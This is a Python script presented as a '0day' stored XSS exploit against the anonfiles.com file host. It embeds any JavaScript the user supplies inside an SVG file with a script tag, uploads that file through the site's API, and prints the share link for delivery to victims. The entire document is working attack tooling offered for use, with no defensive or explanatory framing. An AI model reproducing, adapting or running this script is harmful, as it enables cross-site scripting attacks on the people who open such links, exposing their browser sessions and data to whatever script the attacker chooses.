import requests
import argparse
import sys
import os
import io



PAYLOAD_TEMPLATE = """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="0" height="0" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
        %(js_code)s
    </script>
</svg>"""


def exploit(payload_name, js_payload):
    """ Upload SVG XSS payload to anonfiles.com.
    Uploads SVG XSS payload to anonfiles.com using
    specified JavaScript payload.
    Args:
        payload_name (str): name of uploaded exploit file
        js_payload (str): JavaScript payload to execute.
    Returns:
        str: Download link.
    """
    mem_f = io.BytesIO((PAYLOAD_TEMPLATE % {'js_code': js_payload}).encode())

    res = requests.post('https://api.anonfiles.com/upload', files={'file': (payload_name, mem_f)})

    if res.status_code == 200:
        json_data = res.json()
        return json_data['data']['file']['url']['full']

    return None


if __name__ == '__main__':
    print('\x1b[31manonfiles.com\x1b[0m file upload XSS 0day exploit by author: \x1b[32asn')
    parser = argparse.ArgumentParser()

    parser.add_argument('-p', '--js-payload', help='JavaScript payload file', dest='jsp_fp', required=True)
    parser.add_argument('-n', '--file-name', help='uploaded exploit file name', dest='fn', required=True)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    if not os.path.exists(args.jsp_fp) or os.path.isdir(args.jsp_fp):
        print(f'[-] unknown file path: {args.jsp_fp}')
        sys.exit(1)

    print('[~] reading payload file..')
    with open(args.jsp_fp, encoding='utf-8', errors='ignore') as f:
        jsp_payload = f.read()

    print('[~] crafting & uploading XSS payload...')
    dl_link = exploit(args.fn, jsp_payload)

    if dl_link is None:
        parser.error('an error occured when uploading file')

    print(f'[+] payload uploaded! exploit link: {dl_link}')